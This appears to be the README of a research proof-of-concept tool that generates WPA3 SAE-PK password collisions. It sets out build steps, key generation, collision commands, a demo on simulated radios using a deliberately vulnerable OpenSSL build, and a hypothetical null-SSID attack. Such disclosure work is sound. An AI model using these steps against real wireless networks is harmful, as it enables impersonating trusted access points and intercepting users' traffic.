# WPA3 SAE-PK Password Collision Generator

## Prerequisites

First install some dependencies:

	# Kali Linux and Ubuntu:
	sudo apt-get update
	sudo apt-get install libnl-3-dev libnl-genl-3-dev libnl-route-3-dev libssl-dev \
		libdbus-1-dev git pkg-config build-essential macchanger net-tools python3-venv \
		aircrack-ng rfkill

Then compile hostapd and `sae_pk_gen`:

	cd hostapd
	cp defconfig .config
	make -j 2
	make sae_pk_gen
	cd ..


## Generation multi-network SSIDs collisions

First generate a private key:

	openssl ecparam -name prime256v1 -genkey -noout -out example_key.der -outform der

Now generate a password collision as follows:

	cd hostapd
	./sae_pk_gen cascade example_key.der 3 "FreeWifi 2.4 GHz! "

The tool will construct SAE-PK password collisions for the SSIDs `FreeWifi 2.4 GHz! `, `FreeWifi 2.4 GHz`, ...,
`Free`, and `Fre`. You can see example output in [`sae_pk_gen.txt`](hostapd/sae_pk_gen.txt).


## Testing Using Virtual Interfaces

### Building the tools

Compile `wpa_supplicant`:

	cd wpa_supplicant
	cp defconfig .config
	make -j 2
	cd ..

The latest OpenSSL is no longer affectec by the parsing flexibilities that we abuse.
For our demo attack you need to compile a local OpenSSL build that is still vulnerable
to our attack:

	./init_openssl.sh

The above command will clone the OpenSSL code and build it.


## Create Virtual Wi-Fi Interfaces

Create the virtual interfaces

	sudo modprobe mac80211_hwsim radios=3

Disable Wi-Fi in the network manager so your operating system won't interfere with our Wi-Fi tests.
The do enable Wi-Fi for manual usage using:

	sudo rfkill unblock wifi

Alternatively, you can blacklist the MAC address of your
Wi-Fi dongle so that Linux will automatically ignore the Wi-Fi dongle. This is done by adding
the [following lines](https://wiki.archlinux.org/index.php/NetworkManager#Ignore_specific_devices)
to the file `/etc/NetworkManager/NetworkManager.conf`:

	[keyfile]
	unmanaged-devices=mac:02:00:00:00:00:00

Replace `02:00:00:00:00:00` with the MAC addess of your (virtual) Wi-Fi dongle and then reboot.

## Start the AP and client

You can take the output from `sae_pk_gen` to create a configuration for the client and AP to
confirm the SAE-PK password collision attack. This repository also has two ready-made configurations
where a password collision was constructed for the networks `FreeWifi 2.4 GHz` and `FreeWifi`.

Let's confirm that the client can connect to the `FreeWifi 2.4 GHz` configuration:

	# Open a new terminal, and in the directory hostapd execute:
	cd hostapd
	sudo ./hostapd hostapd_longssid.conf -dd -K
	# Open another terminal, and in the directory wpa_supplicant execute:
	cd wpa_supplicant
	sudo ./client.sh -D nl80211 -i wlan2 -c supp_longssid.conf -dd -K

Note that `client.sh` will start `./wpa_supplicant` using our local build of OpenSSL.
Now let's confirm that the client can connect **using the same password** to `FreeWifi`:

	# Open a new terminal, and in the directory hostapd execute:
	cd hostapd
	sudo ./hostapd hostapd_shortssid.conf -dd -K
	# Open another terminal, and in the directory wpa_supplicant execute:
	cd wpa_supplicant
	sudo ./client.sh -D nl80211 -i wlan2 -c supp_shortssid.conf -dd -K

If you inspect [`supp_longssid.conf`](wpa_supplicant/supp_longssid.conf) and [`supp_shortssid.conf`](wpa_supplicant/supp_shortssid.conf)
you will see that the client used the same SAE-PK password in both configurations, confirm that
the SAE-PK password collision was successfull.


## Appendix: Null SSID Attack

**Note: this is a hypothetical attack if SSIDs longer than 32 characters are allowed.**
Currently SSIDs are limited to a maximum of 32 bytes meaning this attack is currently
only feasible against clients that incorrectly are willing to connect to networks with
a name longer than 32 bytes.

First generate two private keys:

	openssl ecparam -name prime256v1 -genkey -noout -out example_key1.der -outform der
	openssl ecparam -name prime256v1 -genkey -noout -out example_key2.der -outform der

Now generate a password collision as follows:

	cd hostapd
	./sae_pk_gen nullssid example_key1.der example_key2.der 3 Network Network_Other

The tool will output configuration lines to configure two APs.
Note that the first SSID `Network` must be a prefix of the other SSID `Network_Other`.
We can only generate password collisions for SSIDs where one is a prefix of the other.
The two private keys can be the same key.

